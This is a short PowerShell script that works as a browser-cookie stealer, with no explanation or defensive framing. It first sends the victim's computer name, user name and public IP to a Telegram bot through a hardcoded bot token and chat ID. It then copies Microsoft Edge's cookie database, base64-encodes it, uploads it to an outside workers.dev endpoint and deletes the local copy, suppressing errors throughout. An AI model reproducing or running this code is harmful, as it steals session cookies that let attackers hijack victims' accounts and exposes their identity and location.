$t = "8940444810:AAHeKIwsLgAI2o7H20984vi_1K-yEI2J3k8"
$c = "6760965981"

# Send PC info to Telegram
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
$body = @{ chat_id = $c; text = "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip" }
Invoke-RestMethod -Uri "https://api.telegram.org/bot$t/sendMessage" -Method Post -Body $body

# Copy Edge cookies
$src = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$dst = "$env:TEMP\Edge_Cookies.db"
Copy-Item $src $dst -Force -ErrorAction SilentlyContinue

if (Test-Path $dst) {
    $bytes = [System.IO.File]::ReadAllBytes($dst)
    $b64 = [Convert]::ToBase64String($bytes)
    $data = @{
        pc = $env:COMPUTERNAME
        user = $env:USERNAME
        file = $b64
    } | ConvertTo-Json
    
    $worker_url = "https://reciever.tyceno89.workers.dev"
    Invoke-RestMethod -Uri $worker_url -Method Post -Body $data -ContentType "application/json"
    Remove-Item $dst -Force
}
